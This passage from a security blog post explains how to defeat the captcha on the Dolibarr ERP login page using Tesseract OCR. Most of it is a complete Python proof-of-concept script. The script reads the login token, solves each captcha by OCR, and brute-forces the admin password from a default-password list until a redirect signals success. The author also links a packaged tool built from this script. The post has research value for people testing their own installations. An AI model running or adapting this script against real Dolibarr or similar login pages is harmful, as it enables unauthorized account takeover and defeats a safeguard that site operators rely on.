</pre></table></code></div></div><p>Here is a test for our OCR :</p><p><img data-src="https://user-images.githubusercontent.com/72421091/182227996-a3846633-1fd8-4b31-8f6a-a18725539a6d.png" alt="Pasted image 20220731231545" data-proofer-ignore></p><h1 id="login--erros-and-succes">Login : erros and succes</h1><p>For the error message, we have a string “Bad value for login or password”. It’s located in a div</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"center login_main_message"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"error"</span><span class="nt">&gt;</span>
	Bad value for login or password	<span class="nt">&lt;/div&gt;&lt;/div&gt;</span>
</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/72421091/182267159-92d06ea8-a8b1-4cc3-ae2c-4d5e9c859498.png" alt="Pasted image 20220801151908" data-proofer-ignore></p><p>For the wrong captcha, we see a different message but in the same div</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"center login_main_message"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"error"</span><span class="nt">&gt;</span>
	Bad value for security code. Try again with new value...	<span class="nt">&lt;/div&gt;&lt;/div&gt;</span>
</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/72421091/182228073-4b2eeeea-eda0-4a2a-8fa3-a91b7f2b450e.png" alt="Pasted image 20220801152146" data-proofer-ignore></p><p>If we login with right credentials we can see a 302 redirection.</p><p><img data-src="https://user-images.githubusercontent.com/72421091/182228114-57a4bf84-c92a-45f3-b009-85ebc165536b.png" alt="Pasted image 20220801152423" data-proofer-ignore></p><p>I did a simple test for the right login detection. If we find no error message, it’s a successful login. It’s just for the POC. Better have a test case with the 302 redirection status code.</p><p>Notes after debugging :</p><ul><li>My post request refuses to stop following redirects with the option “allow_redirects=False”.<li>The problem is with the used url, i need to use <code class="language-plaintext highlighter-rouge">/index.php?mainmenu=home</code> instead of <code class="language-plaintext highlighter-rouge">/admin/index.php?mainmenu=home</code> to have the 302 redirection.</ul><h1 id="poc">POC</h1><p>Now i’ll combine the OCR reading with the login post request to bruteforce login.</p><ul><li>I’ll use beautifulsoup library to extract token and error messages.<li>Simple loop for testing passwords from a file. I used [:-1] to remove “\n” from passwords to simplify.<li>Use the headers and data values from the captured login post request.<li>Get the used cookies<li>Simple code structure for testing. I’ll make a clean version in my github repository for the tool (at the end of the article).<li>Change the variable <code class="language-plaintext highlighter-rouge">pytesseract.pytesseract.tesseract_cmd</code> for tesseract binary location and OS.</ul><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c1"># Linux
</span><span class="n">pytesseract</span><span class="p">.</span><span class="n">pytesseract</span><span class="p">.</span><span class="n">tesseract_cmd</span> <span class="o">=</span> <span class="s">"/usr/bin/tesseract"</span>

<span class="c1"># Windows
</span><span class="n">pytesseract</span><span class="p">.</span><span class="n">pytesseract</span><span class="p">.</span><span class="n">tesseract_cmd</span> <span class="o">=</span> <span class="s">'C:/Program Files/Tesseract-OCR/tesseract.exe'</span>
</pre></table></code></div></div><h2 id="poc-code"><span class="mr-2">POC code</span><a href="#poc-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
<span class="kn">import</span> <span class="nn">lxml</span>
<span class="kn">import</span> <span class="nn">urllib</span>
<span class="kn">from</span> <span class="nn">io</span> <span class="kn">import</span> <span class="n">BytesIO</span>
<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote_plus</span> <span class="k">as</span> <span class="n">qp</span>
<span class="kn">import</span> <span class="nn">pytesseract</span>
<span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
<span class="kn">from</span> <span class="nn">requests.structures</span> <span class="kn">import</span> <span class="n">CaseInsensitiveDict</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="c1">#Linux
</span><span class="n">pytesseract</span><span class="p">.</span><span class="n">pytesseract</span><span class="p">.</span><span class="n">tesseract_cmd</span> <span class="o">=</span> <span class="s">"/usr/bin/tesseract"</span>

<span class="c1">#Windows
#pytesseract.pytesseract.tesseract_cmd = 'C:/Program Files/Tesseract-OCR/tesseract.exe'
</span>

<span class="n">username</span> <span class="o">=</span> <span class="s">"admin"</span>
<span class="n">passwords</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"default-passwords.txt"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span>

<span class="n">base_url</span> <span class="o">=</span> <span class="s">"http://192.168.1.110/"</span>

<span class="n">login_url</span> <span class="o">=</span> <span class="n">base_url</span> <span class="o">+</span> <span class="s">"index.php?mainmenu=home"</span>

<span class="n">headers</span> <span class="o">=</span> <span class="n">CaseInsensitiveDict</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">get_captcha_code</span><span class="p">(</span><span class="n">base_url</span><span class="p">):</span>
    <span class="n">code</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">5</span><span class="p">:</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s">core/antispamimage.php"</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
        <span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">content</span><span class="p">))</span>
        <span class="c1">#img.show()
</span>        <span class="n">code</span> <span class="o">=</span> <span class="n">pytesseract</span><span class="p">.</span><span class="n">image_to_string</span><span class="p">(</span><span class="n">img</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
        <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">char</span> <span class="ow">not</span> <span class="ow">in</span> <span class="s">"aAbBCDeEFgGhHJKLmMnNpPqQRsStTuVwWXYZz2345679"</span><span class="p">:</span>
                <span class="n">code</span> <span class="o">=</span> <span class="s">""</span>
                <span class="k">break</span>
    <span class="k">return</span> <span class="n">code</span>



<span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">:</span>
    <span class="n">a</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="k">while</span><span class="p">(</span><span class="n">a</span><span class="o">==</span><span class="mi">1</span><span class="p">):</span>
    
        <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
        <span class="n">request</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">login_url</span><span class="p">)</span>

        <span class="n">captcha</span> <span class="o">=</span> <span class="n">get_captcha_code</span><span class="p">(</span><span class="n">base_url</span><span class="p">)</span>

        <span class="c1"># Get the token value
</span>        <span class="n">page_source</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">text</span><span class="p">,</span><span class="s">"lxml"</span><span class="p">)</span>
        <span class="n">token</span> <span class="o">=</span> <span class="n">page_source</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"input"</span><span class="p">,{</span><span class="s">'name'</span><span class="p">:</span><span class="s">'token'</span><span class="p">})[</span><span class="s">'value'</span><span class="p">]</span>
        
        <span class="n">cookies</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">cookies</span>

        <span class="n">headers</span><span class="p">[</span><span class="s">"Connection"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"keep-alive"</span>
        <span class="n">headers</span><span class="p">[</span><span class="s">"Cache-Control"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"max-age=0"</span>
        <span class="n">headers</span><span class="p">[</span><span class="s">"Upgrade-Insecure-Requests"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"1"</span>
        <span class="n">headers</span><span class="p">[</span><span class="s">"Origin"</span><span class="p">]</span> <span class="o">=</span> <span class="n">base_url</span>
        <span class="n">headers</span><span class="p">[</span><span class="s">"Content-Type"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"application/x-www-form-urlencoded"</span>
        <span class="n">headers</span><span class="p">[</span><span class="s">"User-Agent"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36"</span>
        <span class="n">headers</span><span class="p">[</span><span class="s">"Accept"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span>
        <span class="n">headers</span><span class="p">[</span><span class="s">"Referer"</span><span class="p">]</span> <span class="o">=</span> <span class="n">base_url</span> <span class="o">+</span> <span class="s">"index.php?mainmenu=home"</span>
        <span class="n">headers</span><span class="p">[</span><span class="s">"Accept-Language"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"en-US,en;q=0.9,ar;q=0.8,fr;q=0.7"</span>

        <span class="c1"># you can use json object or f string format
</span>        <span class="n">data</span> <span class="o">=</span> <span class="s">"token="</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">quote</span><span class="p">(</span><span class="n">token</span><span class="p">,</span><span class="n">safe</span><span class="o">=</span><span class="s">''</span><span class="p">))</span> <span class="o">+</span> <span class="s">"&amp;actionlogin=login&amp;loginfunction=loginfunction&amp;tz=1&amp;tz_string=Africa%2FCasablanca&amp;dst_observed=0&amp;dst_first=2022-05-8T01%3A59%3A00Z&amp;dst_second=2022-03-27T02%3A59%3A00Z&amp;screenwidth=1038&amp;screenheight=718&amp;dol_hide_topmenu=&amp;dol_hide_leftmenu=&amp;dol_optimize_smallscreen=&amp;dol_no_mouse_hover=&amp;dol_use_jmobile=&amp;username="</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">username</span><span class="p">)</span> <span class="o">+</span> <span class="s">"&amp;password="</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">password</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span> <span class="o">+</span> <span class="s">"&amp;code="</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">captcha</span><span class="p">)</span>

        <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">login_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span> 

        <span class="n">login</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">,</span><span class="s">"lxml"</span><span class="p">)</span>

        <span class="n">error_message</span> <span class="o">=</span> <span class="n">login</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"div"</span><span class="p">,{</span><span class="s">'class'</span><span class="p">:</span><span class="s">'error'</span><span class="p">})</span>

        <span class="c1">#print(str(resp.status_code) + " " + password[:-1])
</span>        
        <span class="k">if</span> <span class="n">error_message</span> <span class="o">!=</span> <span class="bp">None</span> <span class="p">:</span>
            <span class="k">if</span><span class="p">(</span><span class="n">error_message</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s">"Bad value for login or password"</span><span class="p">):</span>
                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[!] [</span><span class="si">{</span><span class="n">resp</span><span class="p">.</span><span class="n">status_code</span><span class="si">}</span><span class="s">] Wrong login </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">password</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
                <span class="n">a</span> <span class="o">=</span> <span class="mi">0</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">error_message</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s">"Bad value for security code. Try again with new value..."</span><span class="p">):</span>
                    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[!] [</span><span class="si">{</span><span class="n">resp</span><span class="p">.</span><span class="n">status_code</span><span class="si">}</span><span class="s">] Wrong captcha ocr. Retrying..."</span><span class="p">)</span>
                    
              
        <span class="k">if</span> <span class="n">resp</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">302</span> <span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[*] Done! </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">password</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s"> "</span><span class="p">)</span>
            <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>

</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/72421091/182228474-5ed02c15-d2d9-479f-936a-ae29f00bc539.png" alt="Pasted image 20220801163308" data-proofer-ignore></p><h1 id="kudos">Kudos</h1><p>Thanks to some exploits authors in exploit-db, I was inspired by their code :</p><ul><li>Dolibarr ERP-CRM 12.0.3 - Remote Code Execution (Authenticated) <a href="https://www.exploit-db.com/exploits/49269">https://www.exploit-db.com/exploits/49269</a><li>Dolibarr 12.0.3 - SQLi to RCE : <a href="https://www.exploit-db.com/exploits/49240">https://www.exploit-db.com/exploits/49240</a></ul><h1 id="tool-in-github">Tool in Github</h1><p>I published the tool with the name <code class="language-plaintext highlighter-rouge">DoliBrute</code>. It has a more clean code than the POC. I’ll work on it for more updates.</p><p><a href="https://github.com/BaadMaro/DoliBrute">https://github.com/BaadMaro/DoliBrute</a></p><p><img data-src="https://user-images.githubusercontent.com/72421091/182228226-64823325-9ddb-43d1-8bf7-388fa6327136.png" alt="Pasted image 20220801192208" data-proofer-ignore></p><h1 id="conclusion">Conclusion</h1><p>I hope you find this article useful. If you want to hunt for vulnerabilities on Dolibarr, go check their secrurity policy <a href="https://github.com/Dolibarr/dolibarr/security/policy">https://github.com/Dolibarr/dolibarr/security/policy</a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/web/'>Web</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/dolibarr/" class="post-tag no-text-decoration" >Dolibarr</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Bypass+captcha+using+OCR+on+Dolibarr+login+page+-+BaadMaro&url=https%3A%2F%2Fbaadmaro.github.io%2Fposts%2FBypass-captcha-using-OCR-on-Dolibarr-login-page%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Bypass+captcha+using+OCR+on+Dolibarr+login+page+-+BaadMaro&u=https%3A%2F%2Fbaadmaro.github.io%2Fposts%2FBypass-captcha-using-OCR-on-Dolibarr-login-page%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fbaadmaro.github.io%2Fposts%2FBypass-captcha-using-OCR-on-Dolibarr-login-page%2F&text=Bypass+captcha+using+OCR+on+Dolibarr+login+page+-+BaadMaro" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/DGSSI-CTF-PRO-Italy-Writeup/">DGSSI CTF PRO 2024 - Italy Writeup</a><li><a href="/posts/Discourse-CVE-2023-47119-Building-a-CVE-POC-from-commits-changes/">Discourse CVE-2023-47119 - Building a CVE POC from commits changes</a><li><a href="/posts/Android-Applications-Pentesting,-Intentional-Exercise-from-Hackerone-platform/">Android Applications Pentesting, Intentional Exercise from Hackerone platform</a><li><a href="/posts/Bypass-captcha-using-OCR-on-Dolibarr-login-page/">Bypass captcha using OCR on Dolibarr login page</a><li><a href="/posts/IoT-Pentesting-with-Teltonika-RUT9XX/">IoT Pentesting with Teltonika RUT9XX</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/android/">Android</a> <a class="post-tag" href="/tags/bug-bounty/">Bug Bounty</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/dgssi/">DGSSI</a> <a class="post-tag" href="/tags/discourse/">Discourse</a> <a class="post-tag" href="/tags/dolibarr/">Dolibarr</a> <a class="post-tag" href="/tags/fat/">FAT</a> <a class="post-tag" href="/tags/firmware/">Firmware</a> <a class="post-tag" href="/tags/router/">router</a> <a class="post-tag" href="/tags/writeup/">Writeup</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Discourse-CVE-2023-47119-Building-a-CVE-POC-from-commits-changes/"><div class="card-body"> <em class="small" data-ts="1699833600" data-df="ll" > Nov 13, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Discourse CVE-2023-47119 - Building a CVE POC from commits changes</h3><div class="text-muted small"><p> I was checking for some Discourse vulnerabilities, and I saw that a new CVE was dropped on 11/10/2023 CVE-2023-47119 The details didn’t mention any POC, so I did some analysis based on the source...</p></div></div></a></div><div class="card"> <a href="/posts/DGSSI-CTF-PRO-Italy-Writeup/"><div class="card-body"> <em class="small" data-ts="1711411200" data-df="ll" > Mar 26, 2024 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>DGSSI CTF PRO 2024 - Italy Writeup</h3><div class="text-muted small"><p> The lab was included in the professional DGSSI CTF hosed in SecDojo platform on February 7, 2024. https://www.linkedin.com/showcase/dgssi-ctf-2024/ Naples machine We start our enumeration wi...</p></div></div></a></div><div class="card"> <a href="/posts/Android-Applications-Pentesting,-Intentional-Exercise-from-Hackerone-platform/"><div class="card-body"> <em class="small" data-ts="1658880000" data-df="ll" > Jul 27, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Android Applications Pentesting, Intentional Exercise from Hackerone platform</h3><div class="text-muted small"><p> Today we are going to practice some Android pentesting with a challenge made by Hackerone platform. I’ll explain different techniques used in Android pentesting with a practical overview. This ar...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Android-Applications-Pentesting,-Intentional-Exercise-from-Hackerone-platform/" class="btn btn-outline-primary" prompt="Older"><p>Android Applications Pentesting, Intentional Exercise from Hackerone platform</p></a> <a href="/posts/Discourse-CVE-2023-47119-Building-a-CVE-POC-from-commits-changes/" class="btn btn-outline-primary" prompt="Newer"><p>Discourse CVE-2023-47119 - Building a CVE POC from commits changes</p></a></div><script type="text/javascript"> $(function () { const origin = "https://giscus.app"; const iframe = "iframe.giscus-frame"; const lightTheme = "light"; const darkTheme = "dark_dimmed"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } let giscusAttributes = { "src": "https://giscus.app/client.js", "data-repo": "BaadMaro/baadmaro.github.io", "data-repo-id": "R_kgDOHRG0bg", "data-category": "General", "data-category-id": "DIC_kwDOHRG0bs4CO51Z", "data-mapping": "title", "data-reactions-enabled": "1", "data-emit-metadata": "0", "data-theme": initTheme, "data-input-position": "bottom", "data-lang": "en", "crossorigin": "anonymous", "async": "" }; let giscusScript = document.createElement("script"); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value)); document.getElementById("tail-wrapper").appendChild(giscusScript); addEventListener("message", (event) => { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; const theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); }); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://github.com/BaadMaro">BaadMaro</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/android/">Android</a> <a class="post-tag" href="/tags/bug-bounty/">Bug Bounty</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/dgssi/">DGSSI</a> <a class="post-tag" href="/tags/discourse/">Discourse</a> <a class="post-tag" href="/tags/dolibarr/">Dolibarr</a> <a class="post-tag" href="/tags/fat/">FAT</a> <a class="post-tag" href="/tags/firmware/">Firmware</a> <a class="post-tag" href="/tags/router/">router</a> <a class="post-tag" href="/tags/writeup/">Writeup</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-JHN65JPH4C"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-JHN65JPH4C'); }); </script>
